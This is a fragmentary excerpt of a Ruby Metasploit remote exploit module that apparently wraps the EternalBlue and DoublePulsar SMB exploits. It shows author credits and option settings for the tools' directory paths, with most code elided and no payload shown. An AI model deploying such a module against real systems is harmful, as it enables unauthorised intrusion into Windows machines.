...
class MetasploitModule < Msf::Exploit::Remote
  ...
  def initialize(info = {})
	  ...
	  ** THIS IS AN INTEGRATION OF THE ORIGINAL EXPLOIT, IT'S NOT THE FULL PORTATION **
      ...
      'Author Code'      =>
        [
          ...
          'Semua Anak TI LPK-Prisma (@prisma_id)'
        ],
		'Payload'        =>
        {
	...
	register_options([
		...
		OptString.new('ETERNALBLUEPATH',[true,'Path directory of Eternalblue','/root/SMBploit/deps/']),
		OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/root/SMBploit/deps/']),
